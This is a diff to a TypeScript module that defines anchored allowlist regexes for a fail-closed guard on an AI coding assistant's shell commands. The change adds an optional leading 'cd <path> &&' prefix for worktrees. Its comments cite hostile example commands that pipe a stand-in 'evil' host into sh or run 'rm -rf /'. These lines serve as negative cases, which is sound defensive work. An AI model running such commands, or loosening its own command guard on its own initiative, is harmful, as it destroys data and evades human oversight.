@@ -55,6 +55,30 @@ export const CAPTURE_TAIL_ERE =
 export const CAPTURE_TAIL_JS_SRC =
     '(\\s+2>(&1|\\/dev\\/null))?(\\s*\\|\\s*(tail|head)(\\s+-(n\\s+)?[0-9]+)?)?\\s*$';
 
+// The DIRECTORY PREFIX every escape hatch tolerates — the 2026-07-30 worktree deadlock.
+//
+// A Bash tool call does NOT persist `cd`: a standalone `cd <worktree>` followed by `pwd` in the next
+// call reports the primary clone again. So an agent working in a linked worktree can only reach that
+// tree with a self-contained `cd <worktree> && …`. The drift guard demanded a BARE `pnpm install`
+// ("do NOT put a cd in front of it") while the install was needed in the worktree — the cure was
+// literally untypable from the place that needed it, and a bare `cd <worktree>` was itself blocked.
+//
+// A leading `cd <path> &&` cannot change what the command does to a repo, so it is not a safety
+// concern; and this stays as un-smuggleable as the rest of the hatch, because the path token accepts
+// only path characters — no whitespace, no quote, no `$`, no backtick, and no shell operator. So
+// `cd /x && pnpm install` passes while `cd $(curl evil) && pnpm install`, `cd /x; rm -rf /` and
+// `cd /x && pnpm install && rm -rf /` all still FAIL CLOSED.
+// Keep in sync with CD_PREFIX_JS_SRC (locked by a unit test).
+export const CD_PREFIX_ERE = '(cd[[:space:]]+[A-Za-z0-9._/@~+-]+[[:space:]]*&&[[:space:]]*)?';
+
+// JS-regex-source twin of CD_PREFIX_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts they agree.
+export const CD_PREFIX_JS_SRC = '(cd\\s+[A-Za-z0-9._\\/@~+-]+\\s*&&\\s*)?';
+
+// Every hatch below starts with the anchor + the optional `cd` prefix. Spliced in place of each
+// pattern's old bare `^`, so the anchoring at both ends is unchanged.
+const CD_PREFIX_ERE_ANCHORED = '^' + CD_PREFIX_ERE;
+const CD_PREFIX_JS_ANCHORED = '^' + CD_PREFIX_JS_SRC;
+
 // Package-manager install commands allowed to pass the fail-closed shim so the assistant can
 // self-heal the guards (run `pnpm install`) when node_modules is absent — otherwise the guard blocks
 // the very command that re-enables it (deadlock). nx/pnpm monorepo only. POSIX ERE (fed to `grep -E`).
@@ -66,23 +90,27 @@ export const CAPTURE_TAIL_JS_SRC =
 //   - subcommands:  install | i  (`pnpm i` / `npm i` is just shorthand for `install`)
 //   - flags:        zero or more `--flag` / `--flag=value` tokens (no whitespace, no operators)
 //
-// No `cd` prefix on purpose: the root package.json IS the install target in this nx monorepo and
-// Claude Code starts at the repo root, so a bare `pnpm install` always works — no `cd` is ever needed,
-// and allowing one would only widen the attack surface of a fail-CLOSED escape hatch.
+// An optional LEADING `cd <path> &&` (CD_PREFIX_ERE) — added 2026-07-30. The old comment here argued a
+// `cd` is never needed because Claude Code starts at the repo root. That is false in a LINKED WORKTREE:
+// git copies no node_modules into a new worktree, so the very first call there needs an install in THAT
+// tree, and `cd` does not persist between tool calls, so `cd <worktree> && pnpm install` is the only
+// spelling that reaches it. Denying the prefix made the cure unreachable from the one place it was
+// needed. It widens nothing: the prefix cannot change what the install does, and the path token admits
+// no operator (see CD_PREFIX_ERE).
 //
 // Why it's un-smuggleable (the whole point of failing closed): the tail is anchored to `$` and only
 // accepts `--word` tokens, so no shell operator (`;`, `&&`, `|`, backticks, `$()`, `>`, `<`) can ride
 // along — `pnpm install && rm -rf /` and `pnpm install; curl evil | sh` still FAIL CLOSED.
 // Keep in sync with INSTALLER_ALLOW_JS below (locked by a unit test).
 export const INSTALLER_ALLOW_ERE =
-    '^(pnpm|npm)[[:space:]]+(install|i)([[:space:]]+--[A-Za-z][A-Za-z0-9=._/@:-]*)*' + CAPTURE_TAIL_ERE;
+    CD_PREFIX_ERE_ANCHORED + '(pnpm|npm)[[:space:]]+(install|i)([[:space:]]+--[A-Za-z][A-Za-z0-9=._/@:-]*)*' + CAPTURE_TAIL_ERE;
 
 // JS-regex twin of INSTALLER_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). The fail-closed shim (pure sh)
 // uses the ERE for the missing-bin case; the runner uses THIS twin (runBashInternal) so installer
 // commands also pass when the bin IS installed but the config is invalid/ahead of the validator —
 // same deadlock, other side. A unit test asserts the two agree on a sample set.
 export const INSTALLER_ALLOW_JS =
-    new RegExp('^(pnpm|npm)\\s+(install|i)(\\s+--[A-Za-z][A-Za-z0-9=._/@:-]*)*' + CAPTURE_TAIL_JS_SRC);
+    new RegExp(CD_PREFIX_JS_ANCHORED + '(pnpm|npm)\\s+(install|i)(\\s+--[A-Za-z][A-Za-z0-9=._/@:-]*)*' + CAPTURE_TAIL_JS_SRC);
 
 // The RECOVERY command, allowed alongside INSTALLER_ALLOW_ERE on every fail-closed path.
 //
@@ -98,11 +126,11 @@ export const INSTALLER_ALLOW_JS =
 // So `rm -rf /`, `rm -rf node_modules/../..`, `rm -rf node_modules; curl evil | sh` all stay DENIED.
 // Keep in sync with RECOVERY_ALLOW_JS below (locked by a unit test).
 export const RECOVERY_ALLOW_ERE =
-    '^rm[[:space:]]+-rf[[:space:]]+(\\./)?node_modules/?([[:space:]]*&&[[:space:]]*(pnpm|npm)[[:space:]]+(install|i)([[:space:]]+--[A-Za-z][A-Za-z0-9=._/@:-]*)*)?' + CAPTURE_TAIL_ERE;
+    CD_PREFIX_ERE_ANCHORED + 'rm[[:space:]]+-rf[[:space:]]+(\\./)?node_modules/?([[:space:]]*&&[[:space:]]*(pnpm|npm)[[:space:]]+(install|i)([[:space:]]+--[A-Za-z][A-Za-z0-9=._/@:-]*)*)?' + CAPTURE_TAIL_ERE;
 
 // JS-regex twin of RECOVERY_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts the two agree.
 export const RECOVERY_ALLOW_JS =
-    new RegExp('^rm\\s+-rf\\s+(\\.\\/)?node_modules\\/?(\\s*&&\\s*(pnpm|npm)\\s+(install|i)(\\s+--[A-Za-z][A-Za-z0-9=._/@:-]*)*)?' + CAPTURE_TAIL_JS_SRC);
+    new RegExp(CD_PREFIX_JS_ANCHORED + 'rm\\s+-rf\\s+(\\.\\/)?node_modules\\/?(\\s*&&\\s*(pnpm|npm)\\s+(install|i)(\\s+--[A-Za-z][A-Za-z0-9=._/@:-]*)*)?' + CAPTURE_TAIL_JS_SRC);
 
 // The exact command we tell the human/assistant to run to recover a corrupt node_modules.
 export const RECOVERY_CMD = 'rm -rf node_modules && pnpm install';
@@ -126,11 +154,11 @@ export const RECOVERY_CMD = 'rm -rf node_modules && pnpm install';
 // what CAUSES this drift, and a fail-closed escape hatch should only contain cures.
 // Keep in sync with SYNC_ALLOW_JS below (locked by a unit test).
 export const SYNC_ALLOW_ERE =
-    '^git[[:space:]]+(pull|fetch|merge)([[:space:]]+(--)?[A-Za-z0-9][A-Za-z0-9=._/@:-]*)*' + CAPTURE_TAIL_ERE;
+    CD_PREFIX_ERE_ANCHORED + 'git[[:space:]]+(pull|fetch|merge)([[:space:]]+(--)?[A-Za-z0-9][A-Za-z0-9=._/@:-]*)*' + CAPTURE_TAIL_ERE;
 
 // JS-regex twin of SYNC_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts the two agree.
 export const SYNC_ALLOW_JS =
-    new RegExp('^git\\s+(pull|fetch|merge)(\\s+(--)?[A-Za-z0-9][A-Za-z0-9=._/@:-]*)*' + CAPTURE_TAIL_JS_SRC);
+    new RegExp(CD_PREFIX_JS_ANCHORED + 'git\\s+(pull|fetch|merge)(\\s+(--)?[A-Za-z0-9][A-Za-z0-9=._/@:-]*)*' + CAPTURE_TAIL_JS_SRC);
 
 // The CURE for the committed-shim self-guard (now enforced by the binary — see committedShimStale
 // below): regenerate .claude/webpieces/ai-hook.sh from renderShim(). Allowed while that guard is up —
@@ -139,11 +167,11 @@ export const SYNC_ALLOW_JS =
 // pnpm/npm/npx; anchored at both ends with only a bare bin name, so no shell operator can ride along.
 // Keep in sync with UPGRADE_SHIM_ALLOW_JS below (locked by a unit test).
 export const UPGRADE_SHIM_ALLOW_ERE =
-    '^(pnpm|npm|npx)([[:space:]]+(exec|run))?[[:space:]]+wp-upgrade-shim' + CAPTURE_TAIL_ERE;
+    CD_PREFIX_ERE_ANCHORED + '(pnpm|npm|npx)([[:space:]]+(exec|run))?[[:space:]]+wp-upgrade-shim' + CAPTURE_TAIL_ERE;
 
 // JS-regex twin of UPGRADE_SHIM_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts they agree.
 export const UPGRADE_SHIM_ALLOW_JS =
-    new RegExp('^(pnpm|npm|npx)(\\s+(exec|run))?\\s+wp-upgrade-shim' + CAPTURE_TAIL_JS_SRC);
+    new RegExp(CD_PREFIX_JS_ANCHORED + '(pnpm|npm|npx)(\\s+(exec|run))?\\s+wp-upgrade-shim' + CAPTURE_TAIL_JS_SRC);
 
 // The exact command we tell the assistant to run to regenerate a reverted/edited committed shim.
 export const UPGRADE_SHIM_CMD = 'pnpm exec wp-upgrade-shim';
@@ -166,11 +194,11 @@ export const UPGRADE_SHIM_CMD = 'pnpm exec wp-upgrade-shim';
 // literal webpieces-owned paths — so no other file can be read or written and no operator can ride
 // along. Keep in sync with RESTORE_SHIM_ALLOW_JS below (locked by a unit test).
 export const RESTORE_SHIM_ALLOW_ERE =
-    '^cp[[:space:]]+(\\./)?node_modules/@webpieces/ai-hook-rules/templates/ai-hook\\.sh[[:space:]]+(\\./)?\\.claude/webpieces/ai-hook\\.sh' + CAPTURE_TAIL_ERE;
+    CD_PREFIX_ERE_ANCHORED + 'cp[[:space:]]+(\\./)?node_modules/@webpieces/ai-hook-rules/templates/ai-hook\\.sh[[:space:]]+(\\./)?\\.claude/webpieces/ai-hook\\.sh' + CAPTURE_TAIL_ERE;
 
 // JS-regex twin of RESTORE_SHIM_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts they agree.
 export const RESTORE_SHIM_ALLOW_JS =
-    new RegExp('^cp\\s+(\\.\\/)?node_modules\\/@webpieces\\/ai-hook-rules\\/templates\\/ai-hook\\.sh\\s+(\\.\\/)?\\.claude\\/webpieces\\/ai-hook\\.sh' + CAPTURE_TAIL_JS_SRC);
+    new RegExp(CD_PREFIX_JS_ANCHORED + 'cp\\s+(\\.\\/)?node_modules\\/@webpieces\\/ai-hook-rules\\/templates\\/ai-hook\\.sh\\s+(\\.\\/)?\\.claude\\/webpieces\\/ai-hook\\.sh' + CAPTURE_TAIL_JS_SRC);
 
 // The exact command the self-guard's deny tells the assistant to run. Works on EVERY installed version.
 export const RESTORE_SHIM_CMD =
@@ -190,11 +218,11 @@ export const RESTORE_SHIM_CMD =
 // Kept as tight as the other escape hatches: anchored at both ends, bare bin name, no flags, so no
 // shell operator can ride along. Keep in sync with INSTALL_HOOKS_ALLOW_JS below (locked by a unit test).
 export const INSTALL_HOOKS_ALLOW_ERE =
-    '^(pnpm|npm|npx)([[:space:]]+(exec|run))?[[:space:]]+wp-install-ai-hooks' + CAPTURE_TAIL_ERE;
+    CD_PREFIX_ERE_ANCHORED + '(pnpm|npm|npx)([[:space:]]+(exec|run))?[[:space:]]+wp-install-ai-hooks' + CAPTURE_TAIL_ERE;
 
 // JS-regex twin of INSTALL_HOOKS_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts they agree.
 export const INSTALL_HOOKS_ALLOW_JS =
-    new RegExp('^(pnpm|npm|npx)(\\s+(exec|run))?\\s+wp-install-ai-hooks' + CAPTURE_TAIL_JS_SRC);
+    new RegExp(CD_PREFIX_JS_ANCHORED + '(pnpm|npm|npx)(\\s+(exec|run))?\\s+wp-install-ai-hooks' + CAPTURE_TAIL_JS_SRC);
 
 // The exact command the self-guard's deny names FIRST. Present in every release that has a shim.
 export const INSTALL_HOOKS_CMD = 'pnpm exec wp-install-ai-hooks';
@@ -223,11 +251,13 @@ export const INSTALL_HOOKS_CMD = 'pnpm exec wp-install-ai-hooks';
 // ---------------------------------------------------------------------------
 export const NO_CHAINING_RULE =
     'Type the option you pick EXACTLY as written, character for character, and run NOTHING else on that line. ' +
-    'Seriously: do NOT append && anything (not even a harmless && git status), do NOT put a cd in front of it, ' +
-    'do NOT wrap it in a subshell. The allowlist is anchored to the ENTIRE command, so anything you bolt on ' +
+    'Seriously: do NOT append && anything (not even a harmless && git status), do NOT wrap it in a subshell. ' +
+    'The allowlist is anchored to the ENTIRE command, so anything you bolt on ' +
     'makes it a DIFFERENT command and it WILL be rejected again - which is not the guard refusing its own cure. ' +
     'If an option already contains &&, that && is part of the command: keep it, and still add nothing beyond it. ' +
-    'The ONLY additions that are tolerated are a trailing 2>&1 or a pipe into tail/head (e.g. 2>&1 | tail -20).';
+    'The only additions tolerated are a LEADING cd <dir> && (needed to run the cure in a linked worktree, since ' +
+    'cd does not persist between tool calls - that one IS accepted), a trailing 2>&1, and a pipe into tail/head ' +
+    '(e.g. cd /path/to/worktree && pnpm install 2>&1 | tail -20).';
 
 // Normal template literal (not String.raw): it carries #235's shell escapes verbatim (\${BIN_NAME},
 // \$REASON, \\n for the deny JSON) AND my sed backslashes (doubled: \\(, \\), \\1, [^"\\\\]). The
